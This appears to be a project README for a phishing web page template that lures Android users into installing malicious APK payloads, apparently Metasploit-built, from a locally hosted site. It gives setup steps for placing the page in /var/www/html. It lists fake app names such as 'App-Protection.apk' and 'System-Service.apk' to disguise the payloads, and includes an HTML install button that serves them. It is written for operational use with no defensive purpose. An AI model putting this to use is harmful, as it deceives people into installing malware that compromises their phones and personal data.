# Android-SE-web-template
A web page template for social engineering the deployment of payloads.

You must download the folders along with the index.html file. The folder Android-SE has supporting files such as images that make up the web page as well as the directory the web page looks for payloads to deploy.

How to use:
After downloading move inde
x.html and the Android-SE folder into /var/www/html. Be sure to rename any files in /var/www/html that are already named index.html to something else like index.html.bak, There can only be one index.html at a time.

Then you you can start building payloads. I use APKBLEACH which you can find at this github.

!!!! **** When creating Payloads keep in mind payload names must match the names on the install/download buttons on the page. **** !!!!

You can either match these names:

    Studio-Edit.apk
    App-Protection.apk
    Droid-Lock.apk
    4G-Booster
    Wifi-Booster.apk
    Sytem-Service.apk
    Memory-Service.apk
    
Or you can name the payloads what ever you want you will just have to change the name on the install/download button which looks like this:

    <td><a data-rel="popup" data-position-to="window"><img src="Android-SE/Images/BLEACH_settings.png" style="height: 20%; width: auto;"></a><button onclick="window.location.href = 'Android-SE/msf_apps/System-Service.apk';" style="border-radius: 10px; font-weight: 400; text-shadow: 1px 2px silver; box-shadow:1px 1px 1px 1px silver; padding: 10px;; color: white ;background-color: #99cc33; position: absolute; right:10%;" class="ui-btn ui-btn-inline">Install</button></td>
            
    After the payload is created it must be placed in the folder /var/www/html/Android-SE/msf_apps
    
    Then hammer on!!
